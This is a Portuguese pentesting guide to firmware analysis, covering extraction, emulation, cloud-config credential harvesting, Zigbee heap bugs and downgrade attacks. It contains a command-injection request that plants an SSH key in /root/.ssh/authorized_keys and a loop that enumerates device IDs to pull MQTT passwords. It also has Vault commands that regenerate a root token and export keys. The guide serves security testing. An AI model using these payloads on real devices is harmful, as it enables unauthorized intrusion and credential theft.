# Análise de firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Introdução**

### Recursos relacionados

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

O firmware é um software essencial que permite que os dispositivos funcionem corretamente, gerenciando e facilitando a comunicação entre os componentes de hardware e o software com o qual os usuários interagem. Ele é armazenado em memória permanente, garantindo que o dispositivo possa acessar instruções vitais assim que for ligado, o que leva à inicialização do sistema operacional. Examinar e, potencialmente, modificar o firmware é uma etapa essencial para identificar vulnerabilidades de segurança.<sup>[[2]](#references)[[3]](#references)</sup>

## **Coleta de informações**

A **coleta de informações** é uma etapa inicial fundamental para entender a composição de um dispositivo e as tecnologias que ele utiliza. Esse processo envolve a coleta de dados sobre:

- A arquitetura da CPU e o sistema operacional executado
- Detalhes do bootloader
- Layout do hardware e datasheets
- Métricas da base de código e locais do código-fonte
- Bibliotecas externas e tipos de licença
- Histórico de atualizações e certificações regulatórias
- Diagramas de arquitetura e fluxo
- Avaliações de segurança e vulnerabilidades identificadas

Para isso, as ferramentas de **open-source intelligence (OSINT)** são inestimáveis, assim como a análise de quaisquer componentes de software open-source disponíveis, por meio de processos de revisão manual e automatizada. Ferramentas como [Coverity Scan](https://scan.coverity.com) e [Semmle’s LGTM](https://lgtm.com/#explore) oferecem análise estática gratuita que pode ser usada para encontrar possíveis problemas.

## **Obtenção do firmware**

A obtenção do firmware pode ser feita de várias maneiras, cada uma com seu próprio nível de complexidade:

- Obtê-lo **diretamente** da fonte (desenvolvedores, fabricantes)
- **Compilá-lo** seguindo as instruções fornecidas
- **Baixá-lo** dos sites oficiais de suporte
- Usar consultas **Google dork** para encontrar arquivos de firmware hospedados
- Acessar diretamente o **cloud storage**, usando ferramentas como [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Interceptar **atualizações** usando técnicas man-in-the-middle
- **Extraí-lo** do dispositivo por meio de conexões como **UART**, **JTAG** ou **PICit**
- **Farejar** solicitações de atualização na comunicação do dispositivo
- Identificar e usar **endpoints de atualização hardcoded**
- **Despejar** o conteúdo do bootloader ou da rede
- **Remover e ler** o chip de armazenamento, quando todas as outras opções falharem, usando as ferramentas de hardware apropriadas

### Logs somente por UART: forçar um root shell usando o ambiente U-Boot na flash

Se o RX da UART for ignorado (somente logs), ainda é possível forçar um shell de init **editando o blob do ambiente U-Boot offline**:<sup>[[6]](#references)</sup>

1. Despeje o conteúdo da SPI flash com um clip SOIC-8 e um programador (3,3 V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Localize a partição env do U-Boot, edite `bootargs` para incluir `init=/bin/sh` e **recalcule o CRC32 do U-Boot env** para o blob.
3. Regrave apenas a partição env e reinicie; um shell deverá aparecer na UART.

Isso é útil em dispositivos embarcados nos quais o shell do bootloader está desativado, mas a partição env pode ser gravada por meio de acesso externo à flash.

## Analisando o firmware

Agora que você **tem o firmware**, precisa extrair informações sobre ele para saber como tratá-lo. Estas são algumas ferramentas que você pode usar para isso:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Se não encontrar muita coisa com essas ferramentas, verifique a **entropia** da imagem com `binwalk -E <bin>`; se for baixa, provavelmente ela não está criptografada. Se for alta, provavelmente está criptografada (ou comprimida de alguma forma).

Além disso, você pode usar estas ferramentas para extrair **arquivos embutidos no firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ou o [**binvis.io**](https://binvis.io/#/) ([código](https://code.google.com/archive/p/binvis/)) para inspecionar o arquivo.

### Obtendo o sistema de arquivos

Com as ferramentas mencionadas anteriormente, como `binwalk -ev <bin>`, você deveria ter conseguido **extrair o sistema de arquivos**.\
O Binwalk geralmente o extrai para uma **pasta com o nome do tipo de sistema de arquivos**, que normalmente é um dos seguintes: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Extração manual do sistema de arquivos

Às vezes, o binwalk **não terá os bytes mágicos do sistema de arquivos em suas assinaturas**. Nesses casos, use o binwalk para **encontrar o deslocamento do sistema de arquivos e extrair o sistema de arquivos comprimido** do binário e **extraia manualmente** o sistema de arquivos de acordo com seu tipo, usando as etapas abaixo.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Execute o seguinte **comando dd** para fazer o carving do sistema de arquivos Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Como alternativa, também é possível executar o seguinte comando.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Para squashfs (usado no exemplo acima)

`$ unsquashfs dir.squashfs`

Os arquivos ficarão no diretório "`squashfs-root`" depois disso.

- Arquivos de archive CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Para sistemas de arquivos jffs2

`$ jefferson rootfsfile.jffs2`

- Para sistemas de arquivos ubifs com flash NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analisando o firmware

Depois de obter o firmware, é essencial analisá-lo para entender sua estrutura e possíveis vulnerabilidades. Esse processo envolve o uso de várias ferramentas para analisar e extrair dados valiosos da imagem do firmware.

### Ferramentas de análise inicial

Um conjunto de comandos é fornecido para a inspeção inicial do arquivo binário (referido como `<bin>`). Esses comandos ajudam a identificar tipos de arquivo, extrair strings, analisar dados binários e entender os detalhes das partições e do sistema de arquivos:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Para avaliar o status de criptografia da imagem, verifica-se a **entropia** com `binwalk -E <bin>`. Uma entropia baixa sugere ausência de criptografia, enquanto uma entropia alta indica possível criptografia ou compactação.

Para extrair **arquivos incorporados**, recomenda-se usar ferramentas e recursos como a documentação **file-data-carving-recovery-tools** e o **binvis.io** para inspecionar arquivos.

### Extraindo o sistema de arquivos

Com `binwalk -ev <bin>`, geralmente é possível extrair o sistema de arquivos, muitas vezes para um diretório com o nome do tipo de sistema de arquivos (por exemplo, squashfs, ubifs). No entanto, quando o **binwalk** não consegue reconhecer o tipo de sistema de arquivos por falta de bytes mágicos, é necessário fazer a extração manualmente. Isso envolve usar `binwalk` para localizar o deslocamento do sistema de arquivos e, em seguida, o comando `dd` para extraí-lo:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Depois, dependendo do tipo de sistema de arquivos (por exemplo, squashfs, cpio, jffs2, ubifs), são usados comandos diferentes para extrair manualmente o conteúdo.

### Análise do sistema de arquivos

Com o sistema de arquivos extraído, começa a busca por falhas de segurança. A atenção se volta para daemons de rede inseguros, credenciais codificadas no código, endpoints de API, funcionalidades do servidor de atualização, código não compilado, scripts de inicialização e binários compilados para análise offline.

**Locais principais** e **itens** a inspecionar incluem:

- **etc/shadow** e **etc/passwd** em busca de credenciais de usuário
- Certificados e chaves SSL em **etc/ssl**
- Arquivos de configuração e scripts em busca de possíveis vulnerabilidades
- Binários embarcados para análise adicional
- Servidores web e binários comuns de dispositivos IoT

Várias ferramentas ajudam a encontrar informações confidenciais e vulnerabilidades no sistema de arquivos:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) e [**Firmwalker**](https://github.com/craigz28/firmwalker) para buscar informações confidenciais
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) para análise abrangente de firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) e [**EMBA**](https://github.com/e-m-b-a/emba) para análise estática e dinâmica

### Verificações de segurança em binários compilados

O código-fonte e os binários compilados encontrados no sistema de arquivos devem ser examinados em busca de vulnerabilidades. Ferramentas como **checksec.sh** para binários Unix e **PESecurity** para binários Windows ajudam a identificar binários desprotegidos que podem ser explorados.

## Coleta de configurações da nuvem e credenciais MQTT por meio de tokens de URL derivados

Muitos hubs IoT buscam sua configuração específica para cada dispositivo em um endpoint da nuvem com um formato como:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Durante a análise do firmware, você pode descobrir que `<token>` é derivado localmente do ID do dispositivo usando um segredo codificado no código, por exemplo:

- token = MD5( deviceId || STATIC_KEY ) e representado como hexadecimal em maiúsculas

Esse projeto permite que qualquer pessoa que descubra um deviceId e o STATIC_KEY reconstrua a URL e obtenha a configuração da nuvem, revelando muitas vezes credenciais MQTT em texto simples e prefixos de tópicos.

Fluxo de trabalho prático:

1) Extraia o deviceId dos logs de inicialização UART

- Conecte um adaptador UART de 3,3 V (TX/RX/GND) e capture os logs:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Procure linhas que exibam o padrão de URL da configuração da nuvem e o endereço do broker, por exemplo:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Recupere STATIC_KEY e o algoritmo do token a partir do firmware

- Carregue os binários no Ghidra/radare2 e procure o caminho de configuração ("/pf/") ou o uso de MD5.
- Confirme o algoritmo (por exemplo, MD5(deviceId||STATIC_KEY)).
- Gere o token no Bash e converta o digest para maiúsculas:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Colete a configuração da cloud e as credenciais do MQTT

- Monte a URL e obtenha o JSON com curl; analise com jq para extrair segredos:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Abuse MQTT em texto simples e ACLs de tópico fracas (se presentes)

- Use as credenciais recuperadas para se inscrever em tópicos de manutenção e procurar eventos sensíveis:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Enumerar IDs de dispositivo previsíveis (em escala, com autorização)

- Muitos ecossistemas incorporam bytes de OUI/produto/tipo do fornecedor seguidos de um sufixo sequencial.
- Você pode iterar por IDs candidatos, derivar tokens e buscar configurações programaticamente:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notas
- Sempre obtenha autorização explícita antes de tentar enumeração em massa.
- Sempre que possível, prefira emulação ou análise estática para recuperar segredos sem modificar o hardware alvo.

O processo de emulação de firmware permite realizar **análise dinâmica** da operação de um dispositivo ou de um programa individual. Essa abordagem pode enfrentar desafios relacionados a dependências de hardware ou arquitetura, mas transferir o sistema de arquivos raiz ou binários específicos para um dispositivo com arquitetura e endianidade correspondentes, como um Raspberry Pi, ou para uma máquina virtual pré-criada pode facilitar testes adicionais.

### Emulação de binários individuais

Para examinar programas individuais, é crucial identificar a endianidade e a arquitetura da CPU do programa.

#### Exemplo com arquitetura MIPS

Para emular um binário com arquitetura MIPS, use o comando:

```bash
file ./squashfs-root/bin/busybox
```

E para instalar as ferramentas de emulação necessárias:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Para MIPS (big-endian), usa-se `qemu-mips`; para binários little-endian, a escolha seria `qemu-mipsel`.

#### Emulação da arquitetura ARM

Para binários ARM, o processo é semelhante, utilizando o emulador `qemu-arm` para a emulação.

### Emulação completa do sistema

Ferramentas como [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) e outras facilitam a emulação completa do firmware, automatizando o processo e auxiliando na análise dinâmica.

## Análise dinâmica na prática

Nesta etapa, usa-se um ambiente de dispositivo real ou emulado para análise. É essencial manter acesso ao shell do sistema operacional e ao sistema de arquivos. A emulação pode não reproduzir perfeitamente as interações com o hardware, o que pode exigir reinicializações ocasionais da emulação. A análise deve revisitar o sistema de arquivos, explorar páginas da Web e serviços de rede expostos e investigar vulnerabilidades do bootloader. Testes de integridade do firmware são cruciais para identificar possíveis vulnerabilidades de backdoor.

## Técnicas de análise em tempo de execução

A análise em tempo de execução envolve interagir com um processo ou binário no ambiente em que é executado, usando ferramentas como gdb-multiarch, Frida e Ghidra para definir breakpoints e identificar vulnerabilidades por meio de fuzzing e outras técnicas.

Para alvos embarcados sem um depurador completo, **copie um `gdbserver` compilado estaticamente** para o dispositivo e conecte-se a ele remotamente:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Mapeamento de mensagens Zigbee / radio-co-processor

Em hubs IoT, a pilha RF costuma ser dividida entre um **MCU de rádio** e um processo de espaço de usuário Linux. Um fluxo de trabalho útil é mapear o caminho:<sup>[[8]](#references)</sup>

1. **Quadro RF** no ar
2. **Parser do lado do controlador** no MCU de rádio
3. **Protocolo de texto ou TLV serial/UART** encaminhado ao Linux (por exemplo, `/dev/tty*`)
4. **Dispatcher da aplicação** no daemon principal
5. **Handler específico do protocolo / máquina de estados**

Essa arquitetura cria dois alvos de reversing, em vez de um. Se o controlador converter quadros binários de rádio em um protocolo textual como `Group,Command,arg1,arg2,...`, identifique:

- Os **grupos de mensagens** e as tabelas de dispatch
- Quais mensagens podem vir da **rede** e quais podem vir do próprio controlador
- Os campos discriminadores específicos do fabricante exatos (por exemplo, Zigbee `manufacturer_code` e `cluster_command` personalizado)
- Quais handlers só podem ser alcançados durante as fases de **commissioning**, descoberta ou download de firmware/modelo

Especificamente para Zigbee, capture o tráfego de pareamento e verifique se o alvo ainda depende da **Link Key** padrão `ZigBeeAlliance09`. Nesse caso, farejar o tráfego de commissioning pode expor a **Network Key**. Os install codes do Zigbee 3.0 reduzem essa exposição; portanto, observe se o dispositivo testado realmente os exige.

### Handlers de protocolo específicos do fabricante e alcançabilidade condicionada pela FSM

Os comandos Zigbee/ZCL específicos do fabricante costumam ser alvos melhores do que os clusters padronizados, pois alimentam **código de parsing personalizado** e **FSMs** internas com validação menos testada em campo.<sup>[[8]](#references)</sup>

Fluxo de trabalho prático:

- Faça reversing do dispatcher de comandos até encontrar o **handler exclusivo do fabricante**.
- Recupere as tabelas de **estado da FSM**, **evento**, **verificação**, **ação** e **próximo estado**.
- Identifique **estados transitórios** que avançam automaticamente e os branches de retry/erro que acabam redefinindo ou liberando estado controlado pelo atacante.
- Confirme quais trocas legítimas do protocolo são necessárias para colocar o daemon no estado vulnerável, em vez de presumir que o handler com bug está sempre acessível.

Para protocolos sensíveis ao tempo, o replay de pacotes com um framework Python pode ser lento demais. Uma abordagem mais confiável é emular um dispositivo legítimo em hardware real (por exemplo, um **nRF52840**) com uma pilha de nível comercial, para expor os **endpoints**, **atributos** e o timing de commissioning corretos.

### Classe de bugs em downloads fragmentados em daemons embarcados

Uma classe recorrente de bugs de firmware aparece em downloads fragmentados de blobs/modelos/configurações:<sup>[[8]](#references)</sup>

1. O **primeiro fragmento** (`offset == 0`) armazena `ctx->total_size` e aloca `malloc(total_size)`.
2. Os fragmentos seguintes validam apenas campos **locais ao pacote** controlados pelo atacante, como `packet_total_size >= offset + chunk_len`.
3. A cópia usa `memcpy(&ctx->buffer[offset], chunk, chunk_len)` sem verificar o **tamanho originalmente alocado**.

Isso permite que um atacante envie:

- Um primeiro fragmento válido com um tamanho total declarado **pequeno** para forçar uma alocação pequena no heap.
- Um fragmento posterior com o **offset esperado**, mas com um `chunk_len` maior.
- Um tamanho local ao pacote forjado que satisfaça as verificações recentes e ainda cause overflow do buffer originalmente alocado.

Quando o caminho vulnerável está protegido pela lógica de commissioning, a exploração precisa incluir emulação suficiente do **dispositivo** para levar o alvo ao estado esperado de download de modelo ou blob antes de enviar os fragmentos malformados.

### Gatilhos de `free()` acionados pelo protocolo

Em daemons embarcados, muitas vezes a maneira mais fácil de acionar a exploração de metadados do heap não é "esperar pela limpeza", mas **forçar o próprio tratamento de erros do protocolo**:<sup>[[8]](#references)</sup>

- Envie fragmentos subsequentes malformados para levar a FSM aos estados de **retry** ou **erro**.
- Exceda o limite de retries para que o daemon **redefina o contexto** e libere o buffer corrompido.
- Use esse `free()` previsível para acionar primitivas do alocador antes que o processo trave por motivos não relacionados.

Isso é especialmente útil contra alocadores **musl/uClibc/dlmalloc-like** em Linux embarcado, nos quais a corrupção de metadados de chunks pode transformar a lógica de unlink/unbin em uma primitiva de escrita. Um padrão estável é corromper um **campo de tamanho** para redirecionar a travessia do alocador a **fake chunks preparados dentro do buffer com overflow**, em vez de sobrescrever imediatamente ponteiros reais de bins e travar o processo.

## Exploração de binários e prova de conceito

Desenvolver uma PoC para vulnerabilidades identificadas exige um entendimento profundo da arquitetura do alvo e programação em linguagens de baixo nível. Proteções de runtime de binários em sistemas embarcados são raras, mas, quando presentes, podem ser necessárias técnicas como Return Oriented Programming (ROP).

### Notas sobre exploração de fastbin em uClibc (Linux embarcado)

- **Fastbins + consolidação:** uClibc usa fastbins semelhantes aos do glibc. Uma alocação grande posterior pode acionar `__malloc_consolidate()`, portanto qualquer fake chunk precisa passar pelas verificações (tamanho válido, `fd = 0` e chunks adjacentes considerados "em uso").<sup>[[6]](#references)</sup>
- **Binários non-PIE sob ASLR:** se o ASLR estiver habilitado, mas o binário principal for **non-PIE**, os endereços `.data/.bss` dentro do binário são estáveis. É possível mirar em uma região que já se pareça com um cabeçalho válido de chunk do heap para direcionar uma alocação fastbin a uma **tabela de ponteiros de função**.
- **NUL que interrompe o parser:** ao fazer parsing de JSON, um `\x00` no payload pode interromper o parsing e manter os bytes controlados pelo atacante que vêm depois, para um stack pivot/cadeia ROP.
- **Shellcode via `/proc/self/mem`:** uma cadeia ROP que chama `open("/proc/self/mem")`, `lseek()` e `write()` pode gravar shellcode executável em um mapeamento conhecido e saltar até ele.

## Sistemas operacionais preparados para análise de firmware

Sistemas operacionais como [AttifyOS](https://github.com/adi0x90/attifyos) e [EmbedOS](https://github.com/scriptingxss/EmbedOS) oferecem ambientes pré-configurados para testes de segurança de firmware, equipados com as ferramentas necessárias.

## Sistemas operacionais preparados para analisar firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS é uma distribuição criada para ajudar na avaliação de segurança e no pentesting de dispositivos da Internet das Coisas (IoT). Ela economiza muito tempo ao oferecer um ambiente pré-configurado com todas as ferramentas necessárias.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): sistema operacional para testes de segurança embarcada baseado no Ubuntu 18.04, com ferramentas de teste de segurança de firmware pré-instaladas.

## Ataques de downgrade de firmware e mecanismos de atualização inseguros

Mesmo quando um fabricante implementa verificações de assinatura criptográfica para imagens de firmware, a **proteção contra reversão de versão (downgrade)** costuma ser omitida. Quando o bootloader ou o carregador de recuperação verifica apenas a assinatura com uma chave pública incorporada, mas não compara a *versão* (ou um contador monotônico) da imagem a ser gravada, um atacante pode instalar legitimamente um **firmware antigo e vulnerável que ainda tenha uma assinatura válida**, reintroduzindo assim vulnerabilidades corrigidas.<sup>[[4]](#references)</sup>

Fluxo de ataque típico:

1. **Obtenha uma imagem antiga assinada**
   * Baixe-a do portal público de downloads, CDN ou site de suporte do fabricante.
   * Extraia-a de aplicativos móveis/de desktop complementares (por exemplo, de `assets/firmware/` dentro de um APK Android).
   * Obtenha-a em repositórios de terceiros, como VirusTotal, arquivos da Internet, fóruns etc.
2. **Envie ou disponibilize a imagem ao dispositivo** por qualquer canal de atualização exposto:
   * Interface web, API do aplicativo móvel, USB, TFTP, MQTT etc.
   * Muitos dispositivos IoT de consumo expõem endpoints HTTP(S) *sem autenticação* que aceitam blobs de firmware codificados em Base64, decodificam-nos no servidor e acionam a recuperação/atualização.
3. Após o downgrade, explore uma vulnerabilidade corrigida em uma versão mais recente (por exemplo, um filtro de command injection adicionado posteriormente).
4. Opcionalmente, grave novamente a imagem mais recente ou desative as atualizações para evitar detecção após obter persistência.

### Exemplo: command injection após downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

No firmware vulnerável (downgraded), o parâmetro `md5` é concatenado diretamente em um comando do shell sem sanitização, permitindo injection de comandos arbitrários (neste caso, habilitando o acesso root por chave SSH). Versões posteriores do firmware introduziram um filtro básico de caracteres, mas a ausência de proteção contra downgrade torna a correção ineficaz.<sup>[[4]](#references)</sup>

### Extraindo Firmware de Aplicativos Móveis

Muitos fornecedores incluem imagens completas de firmware em seus aplicativos móveis complementares para que o aplicativo possa atualizar o dispositivo por Bluetooth/Wi-Fi. Esses pacotes geralmente são armazenados sem criptografia no APK/APEX em caminhos como `assets/fw/` ou `res/raw/`. Ferramentas como `apktool`, `ghidra` ou até mesmo o simples `unzip` permitem extrair imagens assinadas sem tocar no hardware físico.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Bypass de anti-rollback apenas no updater em designs com slots A/B

Alguns fornecedores implementam um **ratchet** anti-downgrade, mas apenas na lógica do *updater* (por exemplo, uma rotina UDS via CAN, um comando de recuperação ou um agente OTA em userspace). Se o **bootloader** verificar depois apenas a assinatura/CRC da imagem e confiar na tabela de partições ou nos metadados do slot, ainda será possível contornar a proteção contra rollback.<sup>[[7]](#references)</sup>

Design fraco típico:

- Os metadados do firmware contêm um descritor de versão e um **ratchet de segurança** / contador monotônico.
- O updater compara o ratchet da imagem com um valor armazenado em armazenamento persistente e rejeita imagens assinadas mais antigas.
- O bootloader **não** analisa esse ratchet e apenas verifica o cabeçalho, o CRC e a assinatura antes de inicializar o slot selecionado.
- A ativação do slot é armazenada separadamente em uma tabela de partições ou em um contador de geração por slot, e **não está vinculada criptograficamente** ao digest exato do firmware que foi validado.

Isso cria uma primitiva de **validar uma imagem / inicializar outra imagem** em sistemas de slot duplo. Se o atacante conseguir fazer com que o updater marque o slot B como próximo alvo de inicialização usando uma imagem assinada atual e, depois, sobrescreva o slot B antes da reinicialização, o bootloader ainda poderá inicializar a imagem rebaixada, pois confia apenas nos metadados de slot já confirmados.

Padrão comum de abuso:

1. Envie um firmware **atual e assinado** para o slot passivo e execute a rotina normal de validação/troca para que o layout marque esse slot como o próximo ativo.
2. **Não reinicie ainda**. Na mesma sessão, entre novamente na rotina de preparação/apagamento do slot.
3. Explore a lógica obsoleta de estado de inicialização ou seleção de slot para que o updater apague o **mesmo slot físico** que acabou de ser promovido.
4. Grave nesse slot um firmware **mais antigo, mas ainda assinado**.
5. Ignore a rotina de validação que aplica o ratchet e reinicie diretamente.
6. O bootloader seleciona o slot promovido, verifica apenas a assinatura/integridade e inicializa a imagem antiga.

O que procurar ao fazer reverse engineering de implementações de atualização A/B:

- Seleção de slot derivada de **flags de inicialização** que não são atualizados após uma troca bem-sucedida.
- Uma rotina no estilo `prepare_passive_slot()` que apaga um slot com base em estado obsoleto, em vez do **layout confirmado atual**.
- Uma função no estilo `part_write_layout()` que apenas incrementa um **contador de geração** / flag de ativo e não armazena o hash da imagem validada.
- Verificações de ratchet implementadas em userspace ou no código do updater, mas **não** na ROM / bootloader / etapas de secure boot.
- Rotinas de apagamento ou recuperação que deixam o slot marcado como inicializável mesmo depois que seu conteúdo foi removido e regravado.

### Lista de verificação para avaliar a lógica de atualização

* O transporte/autenticação do *endpoint de atualização* está adequadamente protegido (TLS + autenticação)?
* O dispositivo compara **números de versão** ou um **contador monotônico anti-rollback** antes de gravar o firmware?
* A imagem é verificada dentro de uma cadeia de secure boot (por exemplo, as assinaturas são verificadas pelo código da ROM)?
* O **bootloader aplica o mesmo ratchet** que o updater, em vez de verificar apenas a assinatura/CRC?
* Os metadados de ativação do slot estão **vinculados ao digest/à versão do firmware validado**, ou o slot pode ser modificado após a promoção?
* Após uma troca de slot bem-sucedida, o dispositivo é forçado a reiniciar ou as rotinas posteriores de atualização/apagamento continuam acessíveis na mesma sessão?
* O código em userland realiza verificações adicionais de sanidade (por exemplo, mapa de partições permitido, número do modelo)?
* Os fluxos de atualização *parcial* ou de *backup* reutilizam a mesma lógica de validação?

> 💡  Se algum dos itens acima estiver ausente, a plataforma provavelmente está vulnerável a ataques de rollback.

## Firmware vulnerável para praticar

Para praticar a descoberta de vulnerabilidades em firmware, use os seguintes projetos de firmware vulnerável como ponto de partida.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Recuperando chaves de descriptografia de firmware a partir do estado de KMS/Vault embarcado

Quando uma imagem de atualização combina pequenos metadados em texto simples com um grande blob de alta entropia, faça a triagem do contêiner antes de tentar qualquer brute force:<sup>[[1]](#references)</sup>

- Extraia cabeçalhos, offsets e limites de linha com `hexdump`, `xxd`, `strings -tx`, `base64 -d` e `binwalk -E`.
- `Salted__` geralmente indica o formato `enc` do OpenSSL: os próximos 8 bytes são o salt e os bytes restantes são o ciphertext.
- Um campo Base64 que decodifica para exatamente `256` bytes é um forte indício de que se trata de um ciphertext RSA-2048 que encapsula uma senha/chave de sessão aleatória do firmware.
- Material PGP destacado no mesmo arquivo costuma proteger apenas a autenticidade; não presuma que seja o mecanismo de confidencialidade.

Se a busca por chaves estáticas (`grep`, `strings`, buscas por PEM/PGP) não funcionar, faça reverse engineering do **fluxo operacional de descriptografia** em vez de procurar apenas chaves privadas:

- Descompile o updater/binário de gerenciamento e rastreie quem lê o blob criptografado, qual helper/API o desembrulha e qual nome lógico de chave ele solicita.
- Procure no filesystem raiz extraído por estado de KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), além de arquivos de unit e scripts de init.
- Trate comandos em texto simples como `vault operator unseal ...`, chaves de recuperação, tokens de bootstrap ou scripts locais de auto-unseal do KMS como equivalentes a material de chave privada.

Se o appliance incluir o binário original do Vault e o backend de armazenamento, reproduzir esse ambiente costuma ser mais fácil do que reimplementar os componentes internos do Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Com root no KMS clonado:

- Torne as chaves de transit exportáveis somente dentro do clone isolado: `vault write transit/keys/<name>/config exportable=true`
- Exporte a chave de unwrap: `vault read transit/export/encryption-key/<name>`
